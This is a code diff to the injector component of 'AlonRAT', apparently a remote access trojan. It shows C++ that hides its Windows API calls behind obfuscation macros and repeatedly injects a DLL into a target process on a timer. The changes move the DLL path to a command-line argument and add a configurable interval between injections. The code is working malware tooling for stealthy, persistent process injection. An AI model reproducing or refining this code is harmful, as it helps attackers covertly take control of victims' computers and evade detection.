@@ -1,14 +1,14 @@
 #include <WS2tcpip.h>
 #include <Windows.h>
 #include <tlhelp32.h>
+#include <stdlib.h>
 #include "utils.h"
 #include <iostream>
 #include <algorithm>
 #include "config.h"
 #include "AutoHandle.h"
 
-#define DLL_PATH OBFUSCATE("C:\\Users\\alonp\\source\\repos\\AlonRAT\\x64\\Release\\AlonRAT.dll")
-#define PROCESS_NAME OBFUSCATE("notepad.exe")
+#define DLL_PATH __argv[1]
 
 
 bool inject(DWORD pid, const char* dll_store_path) {
@@ -129,9 +129,13 @@ DWORD get_pid(const char* process_name) {
 }
 
 int CALLBACK WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR p_cmd_line, int n_cmd_show) {
-    
+    if (__argc != 2) {
+        return 0;
+    }
     initilize_winapi();
     create_mutex_a_type create_mutex_a = WINAPI_OBFUSCATE(create_mutex_a_type, "CreateMutexA", "kernel32");
+
+    sleep_type sleep = WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32");
     while (1) {
         AutoHandle mutex = create_mutex_a(
             0,
@@ -145,7 +149,7 @@ int CALLBACK WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR p_cm
         const auto pid = get_pid(PROCESS_NAME);
         free_if_loaded(pid, DLL_PATH);
         bool result = inject(pid, DLL_PATH);
-        WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32")(1000 * 10);
+        sleep(1000 * SLEEP_BETWEEN_INJECTIONS);
     }
     return 0;
 }
